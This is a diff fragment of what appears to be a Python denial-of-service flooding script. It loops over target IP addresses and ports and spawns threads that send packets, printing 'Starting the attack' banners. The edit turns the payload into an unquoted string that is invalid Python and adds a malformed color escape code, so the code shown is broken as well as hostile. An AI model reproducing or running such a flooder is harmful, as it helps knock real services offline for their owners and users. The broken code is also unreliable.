@@ -84,8 +84,7 @@ time.sleep(3)
 for ip in ips:
     for port in ports:
         # Use a bytes literal to create the data
-        data = b'Hello, this is a DDOS attack'
-        print("Starting the attack on ", ip, " at port ", port, " with a times ", time, "...")
+        data = Welcome to Zona attack
         print("[✴️]  \033[32mRiri  \033[34m" +str(1)+ " \033(33m Starting the attack on \033[94m" +ip+ " \033[0m")
         for i in range(threads):
             t = threading.Thread(target=send_packets, args=(ip, int(port), data, time))
